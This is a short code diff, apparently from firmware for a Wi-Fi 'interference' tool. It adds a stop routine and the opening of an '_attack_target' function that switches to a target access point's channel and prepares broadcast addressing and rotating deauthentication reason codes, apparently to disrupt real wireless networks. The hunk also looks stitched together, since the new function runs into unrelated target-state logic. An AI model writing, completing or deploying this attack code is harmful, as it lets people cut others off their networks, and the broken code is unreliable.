@@ -314,6 +314,25 @@ bool add_interference_target(uint8_t* target_bssid, int channel) {
     }
     return true;
 }
+
+void stop_interference() {
+    _reset_all_targets();
+    num_targets = 0;
+    ledShowIdle();
+    DEBUG_SER_PRINT("[*] INT: Stopped.\n");
+}
+
+static uint32_t _attack_target(BeaconClone* t) {
+    bool is5GHz = (t->target_channel > 14);
+    wext_set_channel(WLAN0_NAME, t->target_channel);
+    delay(CHANNEL_SWITCH_DELAY_MS);
+
+    uint8_t* bssid = t->bssid;
+    static uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    static const uint16_t reasons[] = {1, 4, 6, 7, 8, 2, 3, 9};
+    uint16_t reason = reasons[t->cycle_count % (sizeof(reasons) / sizeof(reasons[0]))];
+    uint32_t sent = 0;
+
     for (int i = 0; i < num_targets; i++) {
         if (targets[i].state == INT_STATE_CAPTURING) return INT_STATE_CAPTURING;
     }
